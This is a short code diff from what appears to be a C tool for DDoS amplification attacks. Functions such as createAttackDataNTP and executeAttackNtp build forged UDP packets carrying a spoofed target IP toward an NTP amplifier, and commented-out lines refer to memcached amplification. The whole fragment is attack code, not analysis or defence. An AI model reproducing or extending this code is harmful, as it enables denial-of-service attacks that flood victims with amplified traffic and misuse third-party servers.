@@ -18,7 +18,6 @@ void ntpSetValue( AttackPlan * p_atkData )
 {
     int sock = CreateSocket(TCP, BLOCK);
     NtpBinaryResponseHeader response;
-
     ConnectTCP(sock, p_atkData->setPacket);
     for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
     {
@@ -44,7 +43,8 @@ static AttackPlan * createAttackDataNTP( LhfDraft *p_draft )
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = NTP;
-    newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
+    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
+    // newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
     // arg = MEMCACHED_GET;
     // newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
     newData->draft = p_draft;
@@ -54,8 +54,7 @@ static AttackPlan * createAttackDataNTP( LhfDraft *p_draft )
 void executeAttackNtp( AttackPlan * atkData )
 {
     char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
-    
-    if(atkData->draft->type == MEMCACHED_GETSET)
+    if(atkData->draft->type == NTP)
     {
         ntpSetValue( atkData );
     }
